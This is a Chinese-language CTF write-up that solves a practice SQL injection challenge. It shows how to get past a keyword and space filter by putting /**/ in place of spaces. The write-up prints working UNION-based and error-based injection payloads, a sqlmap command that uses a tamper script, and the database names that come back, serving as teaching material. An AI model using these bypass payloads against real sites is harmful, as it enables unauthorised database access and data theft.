简单sql注入2

## 题目

> http://ctf5.shiyanbar.com/web/index_2.php
>
> flag
>
> 到底过滤了什么东西？

## 流程图

## 解题步骤

#### 参考文章

##### 0x1 直接猜测表名和字段名

> 首先输入1，发现有将数据库的查询结果显示出来
>
> 输入单引号，发现错误，这时候可以猜测后台查询语句:select name from table where id='xxx';
>
> 输入'='，查询语句变成这样:select name from table where id=''='';     根据从左到右的比较可以得到where字句后面的值为1，而查询也爆出来3个结果
>
> 接下来继续测试，输入'='select，或者'='or,或者'='union等都没有报错，都有三条结果显示出来
>
> 而若是输入' or 1 #或者是' union或者是' or select #都显示侦测到SQL注入了，可以猜想后台应该是应该是这样处理的
>
> （代码大概是这样的，对不对我也不知道）
>
> ```php
> str=_SERVER['QUERY_STRING'];
> 
> str=urldecode(str);
> 
> query_list=explode(' ',str);
> 
> //这个过滤数组应该还有挺多，我就不写了
> 
> $filter_array={'or','#','union','select','where','and'};
> 
> for_each (query_list as value) {
> 
>     if (in_array(value,filter_array)) {
> 
>         echo "SQLI:detected";
> 
>         exit(0);
> 
>     }
> 
> }
> ```
>
> 也就是说，空格和敏感字符的组合是会被查出来的，而在SQL注入中，可以拿来当做间隔用的还有/**/
>
> 于是可以构造以下语句
>
> '/**/union/**/select/**/flag/**/from/**/flag#
>
> 结果可以得到
>
> ```
> ID: '/**/union/**/select/**/flag/**/from/**/flag#
> name: flag{Yxxxxxxxxxxxxxd}
> ```
>
> ```
> 最后，问题来了,怎么知道后台表是flag,字段名是flag？
> ```
>
> ```
> 至于会问这个问题的同学，我猜大概是前面的题没做，做第一道题的时候看别人的解析我也是一脸蒙蔽
> ```
>
> ```
> 也是有这个问题。当然这个表名和字段名可以通过盲注给爆出来，有兴趣的话可以写一个python脚本去
> ```
>
> ```
> 爆破，具体代码我就不贴了
> 最后，新人第一次发帖，打脸请轻打.....
> ```
>
>  

##### 0x2 正常流程读取

> http://www.shiyanbar.com/ctf/writeup/4750

#### 步骤

##### 0x1 直接猜测法

1. 在文本框输入1，提交，链接变成id=1

2. 在文件框输入1'，提交，报错，判断存在注入

3. 在文本框输入`test`，提交，链接变成id=test，未返回错误，说明该注入类型为字符型注入

4. 在简单sql注入1中使用的payload为

   ```mysql
   1 '+unionunion +selectselect +flag+fromfrom +flag+wherewhere+'t'='t
   ```

   在这题中空格已经被过滤了，所以需要将空格替换成/**/，并不使用双重注入

   ```mysql
   1'/**/union/**/select/**/flag/**/from/**/flag/**/where/**/'t'='t
   ```

   由此得到答案

##### 0x2 标准注入 

1. 当采用标准注入时，发现database()被检测出了sql注入

```mysql
1' union/**/select/**/database()'
```

没有想到怎么才能避过检测，于是想到用sqlmap跑一跑

补: 找到了可以绕过`()`的新方法：

```mysql
1'union/**/select/**/schema_name/**/from/**/information_schema.schemata/**/where/**/'1'='1
```



2. 使用sqlmap

   ```shell
   sqlmap.py -u "http://ctf5.shiyanbar.com/web/index_2.php?id=1" --dbs --tamper "space2comment.py" --level 2 -v 3
   ```

   参数说明：

   - --dbs 查找所有数据库
   - "space2comment.py" 将空格转换成为/**/
   - -v 3 显示payload

3. 获取数据库数量的payload

   ```mysql
   1'/**/AND/**/(SELECT/**/8427/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/IFNULL(CAST(COUNT(schema_name)/**/AS/**/CHAR),0x20)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'IUDH'='IUDH
   ```

   返回值：

   `Duplicate entry 'qbtfq3qzqpq1' for key 'group_key'`

   注意其中的值`3`

4. 依次返回三个表的payload

   ```mysql
   1'/**/AND/**/(SELECT/**/8165/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/MID((IFNULL(CAST(schema_name/**/AS/**/CHAR),0x20)),1,50)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA/**/LIMIT/**/0,1),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'xprA'='xprA
   [16:35:47] [INFO] retrieved: information_schema
   ```

   返回结果：

   ### `Duplicate entry 'qbtfqinformation_schemaqzqpq1' for key 'group_key'`

   ```mysql
   [16:35:47] [PAYLOAD] 1'/**/AND/**/(SELECT/**/3904/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/MID((IFNULL(CAST(schema_name/**/AS/**/CHAR),0x20)),1,50)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA/**/LIMIT/**/1,1),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'YvjH'='YvjH
   [16:35:48] [INFO] retrieved: test
   ```

   ```mysql
   [16:35:48] [PAYLOAD] 1'/**/AND/**/(SELECT/**/2380/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/MID((IFNULL(CAST(schema_name/**/AS/**/CHAR),0x20)),1,50)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA/**/LIMIT/**/2,1),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'huJK'='huJK
   [16:35:49] [INFO] retrieved: web1
   ```

   以后来研究一下，sqlmap是如何在避过`database()`检测的情况下，实现查询数据库名的

   

## 解答思路

1. 判断是否存在注入点
2. 判断注入类型
3. 判断后台的过滤机制
   - 关键字被过滤
     - 重复关键词（例如selectselect），不成功
   - 空格被过滤
     - 使用双重空格（使用+号替代也需要重复两次），不成功
   - 使用/**/替换空格，测试成功
   - 在有错误提示的情况下，可以有针对性的修改注入语句，如果没有错误提示，则需要遍历测试可能的绕过方式
4. 需要研究sqlmap的注入流程


## 漏洞挖掘思路

- 无

## 自动化解析

- TODO

- 判断题目特征：`web` `php` `md5` 
- 设定题目难度等级`level`为simple
- 提交相应符合要求的字符串

